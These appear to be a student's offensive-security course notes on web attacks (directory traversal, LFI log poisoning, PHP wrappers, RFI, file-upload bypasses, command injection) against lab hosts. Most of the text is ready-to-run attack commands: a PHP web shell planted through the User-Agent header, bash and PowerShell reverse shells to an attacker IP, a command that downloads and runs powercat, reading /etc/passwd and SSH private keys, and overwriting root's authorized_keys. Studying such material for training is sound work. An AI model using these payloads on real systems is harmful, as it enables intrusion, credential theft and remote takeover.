
## 9.1 Dir Traversal

##### Identifying and Exploiting Dir Traversals
- Look for php scripts ex: //example.com/cms/login.php?language=en.html
	- Navigate to parameter directly to see if a file on server ex: //example.com/cms/en.html
	- If php is calling file as agument -> success ex: //example.com/cms/login.php?language=../../../etc/passwd
- Use curl or burp to format passwd or ssh keys correctly
	- Chmod ssh keys

##### Encoding Special Characters
- replace . with %2e and and / with %2f to defeat filters

## 9.2 LFI

##### LFI
- LFI: execution of code using dir traversal vulnerability
- Log poisoning: common LFI vulnerability
	- Requires modifying data sent to web app so that logs contain executable code
- Need to test if log contains user controlled data (i.e user agent string)
	- `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`
- If UAS present in log -> use Burp to specify custom executable code within UAS field to get reverse shell
- Insert executable code into the log file
	- (Burpe) `User-Agent: Mozzila/5.0 <?php echo system($_GET['cmd']); ?>`
- Use executable code snippet to get reverse shell
	- Base command: `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`
	- URL encoded: `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`
	- Curl: `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=<URL-Enc Reverse Shell>`

##### PHP Wrappers
- PHP offers different wrappers to enchance language functions
- Two common wrappers
	- php://filter
		- use to display contents of executable files instead of executing
	- data://
		- embed executable code as plaintext or base64
		- needs allow_url_include (not default)
- PHP wrapper exploitation
	- Base URL: `curl http://mountaindesserts.com/meteor/index.php?page=admin.php`
	- Curl w/ PHP filter: `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`
	- Base 64 encode PHP file: `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
	- Decode on box to view function/steal creds
- DATA wrapper exploitation
	- Base URL: `curl http://mountaindesserts.com/meteor/index.php?page=admin.php`
	- Encode payload: `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` 
	- Embed code: `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`

##### RFI
- Execution of remote files over http or smb in context of web server
- Needs allow_url_include enabled (not default)
- List of usable PHP shells in /usr/share/webshells/php/

Steps:
1. Switch to /usr/share/webshells/php/ on attack box
2. Host webserver on attack box
3. Curl target URL with desired webshell included in the URL

```
1. cd /usr/share/webshells/php/

2. python3 -m http.server 80

3. curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

```


## 9.3 File Upload Vulnerabilities

#### Using Executable Files
- use of authorized upload forms to upload unauthorized executables
- requires bypass of control filters on web server

Steps:
1. Upload innocent text file to verify upload allows non-images
2. Attempt upload of PHP executable code (/usr/share/webshells/php/simple-backdoor.php)
	1. If failure, change extension to old versions of PHP .phps, .php7
	2. If failure, change capitalization of extension, .pHP
3. Upgrade to interactive shell (ex: Powershell if Windows)
	1. -enc = base64 encoded command to follow

```
1. echo "this is a test" > test.txt //upload to meteor/uploads 

2. cp ./simple-backdoor.php ./simple-backdoor.pHP //upload

3. curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir

4. pwsh  //creating PS reverse shell and Base64-ing

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedTest

5. nc -nvlp 4444

6. curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<BASE64-String> //verify URL encoding correct

7. //Catch reverse shell
```


#### Using Non-executable Files
- Use of upload forms to overwrite system files (ex: SSH keys) if uploaded files cannot be executed
- For non-executable file exploitation, need to leverage other vulnerabilities like dir traversal
- Case study uses upload to overwrite SSH key on Linux machine 
	- Exploits Administrators running web server as root to avoid permission issues

Steps:
1. Locate upload form
2. Send http POST through Burp Repeater and specify relative path (../../../../../../test.txt) for file upload
3. Create key pair on Kali (might need to delete /.ssh/known_hosts locally) 
4. Add public key to authorized_key file
5. Overwrite SSH root key on server 
6. SSH 

```
3. ssh-keygen

4. cat <SSH-Keygen-File> > authorized_keys

5. //In Burp Repeater set Content-Disposition filename=../../../../../root/.ssh/authorized_keys

6. ssh -p 2222 -i <SSH-Keygen-File> root@mountaindesserts.com
```


## 9.4 Command Injection
- Relies on developers directly accepting and (attempting) saniziting user input
- Need to locate upload form that allows you to input code directly before escaping 
- Case study exploits web form for inputting user git repository clone requests

Steps
1. Locate upload form
2. Send traffic to Burp Rpeater to determine how commands are being pushed to the web server (in our case it's `Archive=<git clone request>`)
3. Directly curl Archive parameter with test command 
	1. need to determine what commands will be accepted or blocked
4. Escape sanitization to determine OS info and upload appropriate shell

```
3. //figure out how to escape sanitization
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive

4.1 //We've found its windows, dtr if cmd or powershell env
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell    //base command

curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive    //base64 encoded curl

4.2 // choose shell, set up transfer, and listen
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 ./

python3 -m http.server 80

nc -nvlp 4444

4.3 //upload 
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell  //download powercat and execute

curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive      //actual curl with above command


```





## CV

```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```


## Exercises

```
9.1.2-3
curl http://192.168.193.193:3000/public/plugins/alertlist/../../../../../../../home/offsec/.ssh/id_rsa
```
